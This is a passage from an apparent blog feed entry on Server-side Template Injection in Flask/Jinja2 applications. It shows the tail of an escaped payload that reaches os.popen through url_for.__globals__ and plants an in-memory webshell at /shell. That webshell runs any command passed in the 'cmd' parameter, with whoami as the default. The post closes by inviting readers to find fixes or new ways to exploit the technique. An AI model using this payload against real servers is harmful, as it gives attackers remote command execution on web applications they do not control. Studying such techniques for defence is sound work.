:__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631718243223q0ni26nb.png?imageslim" alt="paste image"><br>Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami.</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>In this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Server-side Template Injection</summary>
      
    
    
    
    
  </entry>
  
</feed>
